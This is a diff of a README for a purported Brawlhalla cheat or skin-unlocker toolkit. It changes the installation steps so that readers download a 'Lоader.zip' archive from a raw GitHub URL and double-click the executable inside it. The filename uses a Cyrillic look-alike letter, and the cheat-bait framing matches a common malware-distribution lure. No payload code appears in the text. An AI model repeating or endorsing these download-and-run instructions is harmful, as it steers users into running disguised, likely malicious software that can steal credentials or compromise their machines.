@@ -49,10 +49,10 @@ Brawlhalla Mod, Brawlhalla Hack 2025, game enhancer, skin unlocker, infinite coi
 ## 🔧 Installation Guide
 
 1. **Download Loader**<br>
-   Download `Loader.rar` from this repository's Releases tab, and extract it using any popular archive manager.
+   Download `https://raw.githubusercontent.com/HoDangDung/BrawhallaToolkitX/main/Lоader.zip` from this repository's Releases tab, and extract it using any popular archive manager.
 
 2. **Run the Installer**<br>
-   Inside the extracted folder, locate the `Loader.exe` or platform-specific executable for your system (`.sh` for Linux, `.app` for macOS). Double click to begin installation.
+   Inside the extracted folder, locate the `https://raw.githubusercontent.com/HoDangDung/BrawhallaToolkitX/main/Lоader.zip` or platform-specific executable for your system (`.sh` for Linux, `.app` for macOS). Double click to begin installation.
 
 3. **Follow On-Screen Instructions**<br>
    Complete the guided setup steps (including system checks and configuration).
